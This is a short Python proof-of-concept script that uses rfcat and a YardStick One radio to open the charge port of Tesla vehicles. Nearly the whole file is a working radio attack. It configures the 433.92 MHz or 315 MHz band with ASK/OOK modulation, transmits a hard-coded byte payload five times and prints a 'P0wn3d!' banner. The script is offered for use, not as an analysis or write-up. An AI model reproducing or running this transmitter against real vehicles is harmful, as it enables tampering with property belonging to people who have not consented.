"""
POC opening Tesla Charger using rfcat
thank you to PickedItMate for the payload conversion
Yardstickone Discord: https://discord.com/channels/807355811281109082/807361197234061374
author: @nocomp
"""
#!/usr/bin/env python
import sys
import time
from rflib import *
from struct import *


d = RfCat()
d.setFreq(433920000) # Freq for EU and rest of the world
#d.setFreq(315000000) #Freq for USA
d.setMdmModulation(MOD_ASK_OOK)
d.setMdmDRate(2500)
d.setAmpMode(1)
print ("Transmition Starting")
d.RFxmit(b'\x15\x55\x55\x51\x59\x4C\xB5\x55\x52\xD5\x4B\x4A\xD3\x4C\xAB\x4B\x15\x94\xCB\x33\x33\x2D\x54\xB4\x56\x9A\x65\x5A\x48\xAC\xC6\x59\x99\x99\x69\xA5\xB2\xB4\xD4\x2A\xD2\x80'*5)



from colorama import init
init(strip=not sys.stdout.isatty()) 
from termcolor import cprint 
from pyfiglet import figlet_format

cprint(figlet_format('P0wn3d!', font='starwars'),
       'yellow', 'on_red', attrs=['bold'])
d.setModeIDLE()
